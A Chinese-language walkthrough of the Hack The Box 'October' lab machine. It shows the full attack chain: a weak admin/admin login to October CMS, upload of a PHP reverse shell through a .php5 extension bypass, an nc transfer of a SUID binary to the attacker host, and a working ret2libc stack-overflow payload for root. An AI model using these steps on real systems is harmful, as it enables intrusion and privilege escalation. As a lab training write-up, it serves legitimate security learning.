# October介绍

![image](https://image.3001.net/images/20211008/1633704899_61605bc399bc32bea3f18.jpg!small)

# nmap 扫描

![image](https://image.3001.net/images/20211008/1633704411_616059db765741a0f2117.png!small)发现开放80和22端口，发现网站的框架为October
CMS.

# 反弹shell

    
    
    作为PHP开源CMS平台,october是一个免费，开源，自托管的CMS平台，基于Laravel PHP框架开发。它构建现代网站的一种高效工具 ，基于灵活的模式。特性：1、页面组件 2、可扩展的平台 3、简单的 AJAX 框架 4、易管理的界面 5、完全基于文件的CMS模板
    

其默认的登录页面为backend目录，或者可以直接用dirbuster扫描出后台登录url，直接用admin/admin弱密码登录，成功登录。

![image](https://image.3001.net/images/20211008/1633705093_61605c85634f4135c754b.png!small)

尝试上传后缀名为php的文件，失败，然后看见目录下全部都是后缀名为php5，然后上传后缀名为php5的文件，成功。  
可以直接上传反弹[php马](https://pentestmonkey.net/tools/web-shells/php-reverse-shell)，修改下端口和地址。

![image](https://image.3001.net/images/20211008/1633705372_61605d9c46a9fc9d85556.png!small)

成功反弹shell  
![image](https://image.3001.net/images/20211008/1633707249_616064f19b023016bc630.png!small)

`python -c 'import pty; pty.spawn("/bin/bash")' ##转化为标准的交互模式`

# 提权

    
    
    SUID (Set owner User ID up on execution) 是给予文件的一个特殊类型的文件权限。在 Linux/Unix中，当一个程序运行的时候， 程序将从登录用户处继承权限。SUID被定义为给予一个用户临时的（程序/文件）所有者的权限来运行一个程序/文件。用户在执行程序/文件/命令的时候，将获取文件所有者的权限以及所有者的UID和GID。
    

`find -perm -4000 2>/dev/null ##搜索尝试查找具有root权限的SUID的文件`  
![image](https://image.3001.net/images/20211008/1633708149_61606875145b1e60a4f71.png!small)

用nc 传到本地来进行调试。

`nc -w 5 10.10.14.3 8003 < ovrflw`  
`nc -l -p 8003 > ovrflw`

用IDA打开，F5反汇编，发现存在strncpy的缓冲区溢出。  
![image](https://image.3001.net/images/20211008/1633708450_616069a21ee5aafef7209.png!small)用gdb+peda调试栈溢出的偏移，可以直接用peda中pattern生成填充的字符串来打印出偏移的大小。  
![image](https://image.3001.net/images/20211008/1633708619_61606a4b04cea6a9aeed0.png!small)

`ldd /usr/local/bin/ovrflw ##发现libc的地址以及位置`  
![image](https://image.3001.net/images/20211009/1633708818_61606b12e8aa94656eca8.png!small)

`readelf -s /lib/i386-linux-gnu/libc.so.6 | grep exit`  
`readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system`  
`strings -t x /lib/i386-linux-gnu/libc.so.6 | grep "/bin/sh"`  
![image](https://image.3001.net/images/20211009/1633708889_61606b59347a67ee9e279.png!small)![image](https://image.3001.net/images/20211009/1633708910_61606b6e2573eb2768b8b.png!small)

> libcstart = 0xb755b000  
> libcsystem_off = 0x00040310  
> libcexit_off = 0x00033260  
> system = libcstart + libcsystem_off=0xb759b310  
> exit = libcstart + libcexit_off=0xb758e260  
> sh_offset = 0x162bac  
> sh = libcstart + sh_offset=0xb76bdbac

payload: 偏移+system+exit+sh

`while true; do /usr/local/bin/ovrflw $(python -c 'print "A" * 112+
"\x10\xb3\x59\xb7\x60\xe2\x58\xb7\xac\xdb\x6b\xb7"'); done`  
![image](https://image.3001.net/images/20211009/1633709780_61606ed415f60b2b33ad7.png!small)

其中刚刚开始是以内核版本为突破口，检查发现靶机内核版本过低，有相关的CVE可以提权。  
![image](https://image.3001.net/images/20211009/1633709909_61606f5599e4a4b2f6029.png!small)  
谷歌搜索发现CVE-2017-16995符合要求  
![image](https://image.3001.net/images/20211009/1633710077_61606ffda7a7954cfad50.png!small)但是nc反弹的shell权限过低，无法完成CVE提权。  
![image](https://image.3001.net/images/20211009/1633710060_61606fecca870affa1e1e.png!small)

# 总结

    
    
    October靶机在hack the box中属于难度中等的靶机，其渗透过程涉及的知识点属于比较常见的类型，但是在最后一步提权的步骤中，涉及到CTF中pwn的栈溢出知识点，相较于之前的提权方法来说，可以说新颖很多，没有依赖现成的工具，对于之后的安全学习之路上，需要兼顾二进制和web,争取做一个全栈的小白。
    

